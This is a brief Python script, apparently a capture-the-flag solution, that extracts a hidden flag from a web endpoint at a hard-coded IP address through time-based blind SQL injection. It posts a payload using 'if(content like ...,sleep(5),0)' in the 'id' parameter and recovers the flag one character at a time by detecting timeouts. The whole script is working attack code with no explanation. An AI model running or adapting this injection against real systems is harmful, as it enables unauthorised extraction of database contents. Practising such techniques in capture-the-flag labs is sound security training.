#!/usr/bin/env python
#Author:Sublime
#coding:utf-8
import string
import requests as req
url = 'http://101.71.29.5:10005/json.php'
data = {
	'id':""
}
flag = ''
payload = """1" || if(content like "%s%%",sleep(5),0)#"""
for x in range(1,35):
	for y in string.ascii_letters+string.digits+'_{}':
		payload1 = payload%(flag+y)
		print payload1
		data['id'] = payload1
		try:
			f = req.post(url,data,timeout=5)
			print f.content
		except:
			flag += y
			print flag
			break